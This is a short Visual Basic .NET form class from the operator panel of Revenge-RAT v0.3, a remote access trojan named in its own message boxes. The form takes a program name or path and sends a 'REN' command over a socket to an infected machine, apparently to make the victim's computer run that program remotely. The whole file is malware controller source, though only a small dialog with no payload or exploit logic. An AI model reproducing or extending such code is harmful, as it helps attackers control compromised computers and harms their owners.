Public Class CT
    Public Sock As Integer
    Private Sub C_Click(sender As Object, e As EventArgs) Handles C.Click
        Me.Close()
    End Sub

    Private Sub P_KeyPress(sender As Object, e As KeyPressEventArgs) Handles P.KeyPress
        If (e.KeyChar = ChrW(13)) Then
            If (Me.P.Text.Length = 0) Then
                MessageBox.Show("this is not a valid program name or path", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Hand)
            Else
                My.Forms.Main.s.Send(Me.Sock, String.Concat(New String() {"REN", My.Forms.Main.Key, Me.P.Text, My.Forms.Main.Key, Me.AN.Checked.ToString}))
                Me.Close()
            End If
        End If
    End Sub

    Private Sub SC_Click(sender As Object, e As EventArgs) Handles SC.Click
        If (Me.P.Text.Length = 0) Then
            MessageBox.Show("this is not a valid program name or path", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Hand)
        Else
            My.Forms.Main.s.Send(Me.Sock, String.Concat(New String() {"REN", My.Forms.Main.Key, Me.P.Text, My.Forms.Main.Key, Me.AN.Checked.ToString}))
            Me.Close()
        End If
    End Sub
End Class